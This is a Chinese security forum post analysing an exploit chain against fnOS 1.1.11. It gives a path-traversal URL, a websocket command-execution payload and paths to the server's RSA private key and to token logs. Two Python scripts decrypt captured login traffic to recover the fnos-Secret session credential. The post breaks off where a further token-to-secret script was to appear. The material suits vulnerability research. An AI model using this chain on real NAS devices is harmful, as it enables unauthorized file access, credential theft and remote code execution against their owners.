
# [原创]fnOS路径穿越与命令执行漏洞利用分析

## 安装环境

下载历史版本镜像，以1.1.11为例，向cfcK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3L8X3&6S2M7#2)9J5k6h3y4G2L8g2)9J5c8X3q4H3K9g2)9J5c8X3c8G2N6$3&6D9L8$3q4V1i4K6u0V1M7$3W2Y4L8R3`.`. `post` 如下请求获得下载地址

![](https://bbs.kanxue.com/upload/attach/202602/929564_5Y2364HQXDFMQDF.webp)

安装完成之后即可访问web页面

![](https://bbs.kanxue.com/upload/attach/202602/929564_H9FJY2PCEVXEUJE.webp)

初始化之后成功进入桌面

![](https://bbs.kanxue.com/upload/attach/202602/929564_SGPKQ7P4GU2MUB9.webp)

## 测试poc

链接后加入`/app-center-static/serviceicon/myapp/%7B0%7D?size=../../../../`可以直接遍历文件

![](https://bbs.kanxue.com/upload/attach/202602/929564_698UDPA2JEDVZJ7.webp)

抓包验证一下websocket开头的校验信息计算方式，正常的websocket请求：

![](https://bbs.kanxue.com/upload/attach/202602/929564_4UP98M86RWEY66R.webp)

浏览器中存储的`fnos-Secret`：

![](https://bbs.kanxue.com/upload/attach/202602/929564_YTW2DW48SC58443.webp)

尝试构造校验信息，成功

![](https://bbs.kanxue.com/upload/attach/202602/929564_SNM7ZSJM6YET3R2.webp)

命令执行payload：

```
{"reqid":"697da669697da3bc000000090f31","req":"appcgi.dockermgr.systemMirrorAdd","url":"579K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1k6i4y4@1i4K6u0W2k6i4S2S2L8i4m8D9k6g2)9J5k6h3y4G2L8g2)9J5y4X3&6T1M7%4m8Q4x3@1u0Q4x3@1u0Q4x3U0k6F1j5Y4y4H3i4K6y4n7i4K6u0r3N6i4y4J5i4K6u0r3j5X3W2F1i4K6u0r3N6r3!0#2j5$3S2Q4x3U0k6F1j5Y4y4H3i4K6y4n7i4K6u0r3N6r3#2H3i4K6u0r3K9r3q4U0K9$3g2V1x3U0l9J5y4U0l9I4x3K6q4Q4x3U0k6F1j5Y4y4H3i4K6y4n7i4K6y4n7i4K6t1$3L8X3u0K6M7q4)9K6b7W2)9J5c8Y4g2K6M7W2)9J5c8X3u0A6L8W2)9J5c8X3g2U0K9r3!0Q4x3U0k6F1j5Y4y4H3i4K6y4n7i4K6t1$3M7i4g2G2N6q4)9K6b7W2)9J5b7#2)9J5y4Y4q4#2L8%4c8Q4x3@1u0F1j5h3#2W2i4K6t1$3M7i4g2G2N6q4)9K6b7W2)9K6b7g2)9J5y4Y4q4#2L8%4c8Q4x3@1t1J5i4K6t1$3M7i4g2G2N6q4)9K6b7W2)9%4c8l9`.`.
```

前面构造校验信息尝试命令执行

![](https://bbs.kanxue.com/upload/attach/202602/929564_RAEPWQRA3NRZJSC.webp)

执行成功

![](https://bbs.kanxue.com/upload/attach/202602/929564_GBT2MMQYBNPXUWZ.webp)

## 获得`fnos-Secret`

在`/var/log/accountsrv/info.log`中有账号登录相关的日志，存储了`fnos-token`

![](https://bbs.kanxue.com/upload/attach/202602/929564_6EGE5495ZD9CW6V.webp)

查看登录的websocket请求，发送：

![](https://bbs.kanxue.com/upload/attach/202602/929564_SQKS6ZU992PDUWC.webp)

返回：

![](https://bbs.kanxue.com/upload/attach/202602/929564_VK7V3TDRNYRPTUZ.webp)

结合js可以知道是客户端生成了随机的`key`和`iv`，获取服务端的`publickey`，使用`key`和`iv`对登录信息进行加密，然后使用`publickey`对`key`进行rsa，将加密的`key`和`iv`和aes之后的登录信息发送到服务端，服务端验证之后返回`token`和`secret`。拿到服务器的私钥就可以解密这些数据了，通过目录遍历下载：`/usr/trim/etc/rsa_private_key.pem`，让AI写个简单脚本：

```
import base64

import json

from Crypto.PublicKey import RSA

from Crypto.Cipher import PKCS1_v1_5

from Crypto.Cipher import AES

from Crypto.Util.Padding import unpad

from Crypto.Random import get_random_bytes



# ================= 配置区域 =================



# 1. 抓包获取的数据

payload = {

"iv": "UaNep6YYc/lwPBAZb1yhJw==",

"rsa": "xxx",

"aes": "xxx"

}



# 2. 私钥路径

PRIVATE_KEY_FILE = "private.pem"



# ================= 逻辑区域 =================



def decrypt_flow():

try:

# --- 步骤 1: RSA 解密获取 AES Session Key ---

print("[*] 正在读取私钥...")

with open(PRIVATE_KEY_FILE, "rb") as f:

private_key = RSA.import_key(f.read())

# Base64 解码 RSA 密文

encrypted_session_key = base64.b64decode(payload["rsa"])

# 使用 PKCS1_v1_5 解密

cipher_rsa = PKCS1_v1_5.new(private_key)

sentinel = get_random_bytes(16) # 解密失败时的随机值

# 获取 AES Key

session_key = cipher_rsa.decrypt(encrypted_session_key, sentinel)

if session_key == sentinel:

print("[-] RSA 解密失败，私钥可能不匹配或填充模式错误。")

return



print(f"[+] RSA 解密成功! 获得 AES Session Key (Hex): {session_key.hex()}")

print(f"    Key 长度: {len(session_key) * 8} 位")



# --- 步骤 2: AES 解密获取明文数据 ---

print("\n[*] 开始解密 AES 数据...")

# Base64 解码 IV 和 AES 密文

iv = base64.b64decode(payload["iv"])

encrypted_data = base64.b64decode(payload["aes"])

# 创建 AES Cipher (通常是 CBC 模式)

cipher_aes = AES.new(session_key, AES.MODE_CBC, iv)

# 解密并移除填充 (PKCS7)

try:

decrypted_padded = cipher_aes.decrypt(encrypted_data)

plaintext_bytes = unpad(decrypted_padded, AES.block_size)

plaintext_str = plaintext_bytes.decode('utf-8')

print("[+] AES 解密成功!")

print("-" * 30)

# 尝试解析为 JSON 并漂亮打印

try:

json_obj = json.loads(plaintext_str)

print(json.dumps(json_obj, indent=4, ensure_ascii=False))

except:

print(plaintext_str)

print("-" * 30)

except ValueError as e:

print(f"[-] AES 解密或去填充失败: {e}")

print("    可能原因: Key 错误 (RSA解密错) 或 模式不是 CBC")



except FileNotFoundError:

print(f"[!] 找不到私钥文件: {PRIVATE_KEY_FILE}")

except Exception as e:

print(f"[!] 发生未预期的错误: {e}")



if __name__ == "__main__":

decrypt_flow()
```

验证成功

![](https://bbs.kanxue.com/upload/attach/202602/929564_V2PV32G4EMABXFB.webp)

通过js代码还可以知道服务器返回的`secret`就是aes加密过的`fnos-Secret`，再写脚本验证一下

```
import base64

import json

from Crypto.PublicKey import RSA

from Crypto.Cipher import PKCS1_v1_5

from Crypto.Cipher import AES

from Crypto.Util.Padding import unpad, pad

from Crypto.Random import get_random_bytes



# ================= 填入你的抓包数据 =================



# 1. 登录请求包 (Request)

request_payload = {

"iv": "UaNep6YYc/lwPBAZb1yhJw==",  # 对应代码中的 CT (Base64)

"rsa": "LAThXfsHgrZWegUJ4eG4qmdz+yucF31JuAt4MqJL9DzHLrO2KvS9FqnPbw5BUwohwfvwqeLEzIYeFmgE/uAei2Cv8X5cL+Uzb+ctHJgVVfikLaTFP1+Du3w4ohQedXRinUjolHuZvX4dIY9Nb4PW1NxHdYv3MulO8JswbQtZlHMGFfLy+7MofWfY0XZhKolSvcwQ2r+wwJnZqMVIdA2EIRrY/oTcnPLysgjJnRPNY1zu2Vd31tmCvvPNjAERB33hI+Q4p8Ro/PMs0xYCjDQGsxLIlKKJr731n4+jetd56UvQLmigs4WnHjMAhYddaT8vll1j1a9ITSAd5Air4Pfwaw==",

}



# 2. 登录响应包 (Response)

server_response = {

"secret": "CkcJHbGW4jRaBo14reTZdN24CTDn2VuKIcwjFaCmMeM=" # 服务器返回的加密 Secret

}



# 3. 私钥路径

PRIVATE_KEY_FILE = "private.pem"



# =================================================



def calculate_fnos_secret():

try:

# --- 步骤 1: 用私钥解密 RSA，拿到 AES Session Key ---

print("[*] 正在读取私钥...")

with open(PRIVATE_KEY_FILE, "rb") as f:

private_key = RSA.import_key(f.read())

rsa_ct = base64.b64decode(request_payload["rsa"])

cipher_rsa = PKCS1_v1_5.new(private_key)

sentinel = get_random_bytes(16)

# 这就是代码里的 'Yz' (的二进制形式)

session_key_bytes = cipher_rsa.decrypt(rsa_ct, sentinel)

# 前端代码 Yz = iWe(32) 生成的是32字节字符串，但CryptoJS处理时会作为WordArray

# 这里的解密结果应该是原始的字节流

print(f"[+] 拿到 Session Key (Hex): {session_key_bytes.hex()}")

# --- 步骤 2: 准备解密参数 ---

iv_bytes = base64.b64decode(request_payload["iv"])

encrypted_secret_bytes = base64.b64decode(server_response["secret"])

print(f"[*] IV (Hex): {iv_bytes.hex()}")

print(f"[*] Server Secret (Hex): {encrypted_secret_bytes.hex()}")



# --- 步骤 3: 模拟 fWe 函数进行解密 ---

# fWe = t => Ti.AES.decrypt(t, qz, { iv: CT }).toString(Ti.enc.Base64);

cipher_aes = AES.new(session_key_bytes, AES.MODE_CBC, iv_bytes)

# AES 解密

decrypted_bytes = cipher_aes.decrypt(encrypted_secret_bytes)

# 移除 Padding (PKCS7) - 虽然CryptoJS的toString(Base64)会自动处理，但Python需要手动

# 注意：有时候CryptoJS处理字符串填充比较宽容，如果报错，尝试不去掉unpad直接看

try:

final_secret_bytes = unpad(decrypted_bytes, AES.block_size)

except ValueError:

# 如果解密出来刚好是整块，或者格式特殊，直接用原始的

final_secret_bytes = decrypted_bytes



# 转为 Base64 (对应 toString(Ti.enc.Base64))

fnos_secret = base64.b64encode(final_secret_bytes).decode('utf-8')

print("\n" + "="*40)

print(f"SUCCESS! 计算出的 fnos-Secret: {fnos_secret}")

print("请检查这个值是否与你浏览器 LocalStorage 中的值一致。")

print("="*40)



except Exception as e:

print(f"[-] 发生错误: {e}")



if __name__ == "__main__":

calculate_fnos_secret()
```

验证成功

![](https://bbs.kanxue.com/upload/attach/202602/929564_S975M446VEBQXF3.webp)

接下来寻找服务端的逻辑，通过websocket返回的字段找出来二进制文件`/usr/trim/bin/handlers/user.hdl`

![](https://bbs.kanxue.com/upload/attach/202602/929564_9MWZPPAA36JWPWV.webp)

逆向找到关键逻辑，找到`secret`生成逻辑，是随机数

![](https://bbs.kanxue.com/upload/attach/202602/929564_4E6FYVUF7UVE6SQ.webp)

然后用生成的`token`前16字节当`iv`，用某个`key`加密，结果存到`token`后16字节里

![](https://bbs.kanxue.com/upload/attach/202602/929564_67748GKB7JHPGQ9.webp)

![](https://bbs.kanxue.com/upload/attach/202602/929564_ZT4DSDSGCR5G27A.webp)

所以使用`token`的前16个字节当作`iv`后16个字节当作密文，私钥中的特定字符当作`key`对秘文进行解密就可以得到`secret`，写个简单的脚本即可从`token`复原`secret`：
